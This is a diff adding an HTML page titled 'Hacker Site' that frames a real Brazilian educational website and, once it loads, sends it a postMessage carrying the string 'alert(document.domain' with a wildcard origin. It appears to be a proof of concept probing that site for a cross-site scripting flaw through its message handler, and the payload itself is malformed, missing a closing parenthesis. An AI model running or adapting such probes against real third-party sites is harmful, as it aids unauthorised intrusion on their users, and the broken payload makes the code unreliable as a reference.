@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=, initial-scale=1.0">
+    <title>Hacker Site</title>
+    <style>
+        iframe {
+            width: 1000px;
+            height: 700px;
+            position:relative;
+            left: 100px;
+            top: 100px;
+        }
+    </style>
+</head>
+<body>
+    
+    <iframe id="alvo"></iframe>
+
+    <script>
+        var alvo = document.getElementById('alvo')
+
+        alvo.addEventListener('load', () =>{
+            alvo.contentWindow.postMessage('alert(document.domain', '*')
+        })
+
+        alvo.src = 'https://brasilescola.uol.com.br'
+    </script>
+</body>
+</html>
